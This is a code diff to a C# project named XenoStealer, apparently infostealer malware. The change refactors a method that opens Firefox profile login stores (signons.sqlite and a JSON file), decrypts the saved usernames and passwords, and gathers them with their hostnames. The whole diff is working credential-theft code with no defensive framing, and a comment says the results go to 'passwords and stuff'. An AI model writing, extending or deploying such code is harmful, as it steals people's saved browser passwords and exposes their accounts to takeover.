@@ -212,6 +212,12 @@ namespace XenoStealer
         }
         public static DataExtractionStructs.GeckoLogin[] GetLogins(string profilePath) 
         {
+            GeckoDecryptor decryptor = new GeckoDecryptor(profilePath);
+            if (!decryptor.operational) 
+            {
+                return null;
+            }
+
             List<DataExtractionStructs.GeckoLogin> logins = new List<DataExtractionStructs.GeckoLogin>();
 
             string SQLpath = Path.Combine(profilePath, "signons.sqlite");
@@ -258,8 +264,8 @@ namespace XenoStealer
                         {
                             continue;
                         }
-                        string username = GeckoDecryptor.DecryptBase64(profilePath, encryptedUsername);
-                        string password = GeckoDecryptor.DecryptBase64(profilePath, encryptedPassword);
+                        string username = decryptor.DecryptBase64(encryptedUsername);
+                        string password = decryptor.DecryptBase64(encryptedPassword);
                         if (hostname == null || username == null || password == null) continue;
                         logins.Add(new DataExtractionStructs.GeckoLogin(username, password, hostname));
                         //add it to passwords and stuff.
@@ -307,8 +313,8 @@ namespace XenoStealer
                                 string hostname = (string)login["hostname"];
                                 string encryptedUsername = (string)login["encryptedUsername"];
                                 string encryptedPassword = (string)login["encryptedPassword"];
-                                string username = GeckoDecryptor.DecryptBase64(profilePath, encryptedUsername);
-                                string password = GeckoDecryptor.DecryptBase64(profilePath, encryptedPassword);
+                                string username = decryptor.DecryptBase64(encryptedUsername);
+                                string password = decryptor.DecryptBase64(encryptedPassword);
                                 if (hostname == null || username == null || password == null) continue;
                                 logins.Add(new DataExtractionStructs.GeckoLogin(username, password, hostname));
                                 //add it to passwords and stuff.
